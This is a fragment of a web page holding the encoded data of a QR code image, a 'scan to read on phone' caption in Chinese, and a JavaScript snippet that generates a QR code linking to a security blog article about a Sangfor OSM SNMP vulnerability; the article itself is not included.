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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/sangfor\_osm-SNMP-save\_SNMP-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 